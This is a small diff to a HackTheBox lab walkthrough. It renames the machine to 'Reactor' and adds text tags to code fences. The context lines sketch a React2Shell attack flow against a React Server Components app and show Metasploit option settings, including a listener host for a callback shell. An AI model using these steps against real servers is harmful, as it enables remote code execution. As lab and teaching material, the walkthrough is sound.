@@ -10,7 +10,7 @@ tags:
     "React2Shell",
     "NodeJS debugger",
   ]
-summary: Walkthrough for Connected machine on HackTheBox
+summary: Walkthrough for Reactor machine on HackTheBox
 ---
 
 ## Machine Summary
@@ -60,7 +60,7 @@ The vulnerable property resolution allows an attacker to traverse the JavaScript
 
 The simple attack flow:
 
-```
+```text
 malicious HTTP Request
     ↓
 RSC/Flight payload
@@ -93,7 +93,7 @@ search react2shell
 
 We know that the machine runs Ubuntu through `nmap` scan so we `use 1` to choose module 1. Type `options` to see module options, here we set the options:
 
-```
+```text
 set rhosts reactor.htb
 set rport 3000
 set lhost <YOUR-TUN0-IP>
